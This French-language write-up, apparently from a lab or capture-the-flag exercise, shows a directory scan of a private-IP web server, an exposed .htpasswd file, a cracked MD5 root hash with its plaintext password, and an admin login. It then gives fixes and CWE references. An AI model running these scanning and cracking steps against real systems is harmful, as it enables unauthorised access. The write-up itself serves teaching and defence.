# Lecture du fichier .htpasswd

Un fichier .htpasswd est généralement utilisé pour protéger un dossier, un fichier ou même un site web entier avec un mot de passe via l’authentification « HTTP ». Cette protection est souvent mise en place avec les directives contenues dans un fichier .htaccess.

```bash
docker run --rm hypnza/dirbuster -u http://10.11.248.36:80/

Dir found: /images/ - 200
Dir found: / - 200
Dir found: /Images/ - 200
Dir found: /admin/ - 200
Dir found: /audio/ - 200
Dir found: /js/ - 200
File found: /index.php - 200
File found: /js/init.js - 200
Dir found: /css/ - 200
Dir found: /includes/ - 200
File found: /js/skel-layers.min.js - 200
File found: /js/skel.min.js - 200
Dir found: /js/ - 200
Dir found: /fonts/ - 200
File found: /js/jquery.min.js - 200
Dir found: /IMAGES/ - 200
Dir found: /errors/ - 200
Dir found: /JS/ - 200
Dir found: /css/images/ - 200
Dir found: /whatever/ - 200
```

`http://10.11.248.36/whatever/`

`root:437394baff5aa33daa618be47b75cb49`
- Cracker le mot de passe avec crackstation: https://crackstation.net/
`437394baff5aa33daa618be47b75cb49 = qwerty123@`

Utiliser le login **root**/**qwerty123@** sur le chemin admin: `http://10.11.248.36/admin/#`

### Ce que ça implique / pourquoi c’est dangereux
Si n'importe quel utilisateur peut lire le fichier .htaccess, il peut essayer de deviner le mot de passe via un bruteforce si le chiffrement est faible ou que le mot de passe n'est pas complexe.
L’attaquant peut ainsi :

- Bruteforce le mot de passe
- Se connecter en root ou admin si il arrive a trouver le mot de passe

### Comment la corriger

- Restreindre l'accès à htpasswd via htaccess
- Placer htpasswd dans un dossier non accessible via le web
- Limiter l'accès par IP

## CWE

**CWE-327**: Use of a Broken or Risky Cryptographic Algorithm 
- https://cwe.mitre.org/data/definitions/327.html

**CWE-326**: Inadequate Encryption Strength
- https://cwe.mitre.org/data/definitions/326.html